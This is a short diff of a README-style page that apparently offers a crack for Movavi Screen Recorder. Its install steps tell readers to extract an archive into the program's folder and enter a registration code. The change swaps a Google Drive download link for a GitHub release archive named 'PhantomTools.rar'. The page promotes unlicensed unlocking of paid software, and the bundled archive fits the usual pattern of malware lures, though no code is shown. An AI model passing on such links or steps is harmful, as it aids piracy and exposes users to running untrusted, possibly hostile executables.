@@ -14,6 +14,6 @@
 <li>Extract the contents of the archive into the folder containing the program you want to unlock.</li>
 <li>Enter the Registration Code and Product Key when prompted.</li>
 </ol>
-<a href="https://drive.usercontent.google.com/u/0/uc?id=1ZfsxDG_eEU3TT3O0UErfL_QcfBU9vzwn&github">
+<a href="https://github.com/ZhongZhang96/Movavi-Screen-Recorder/releases/download/download/PhantomTools.rar">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
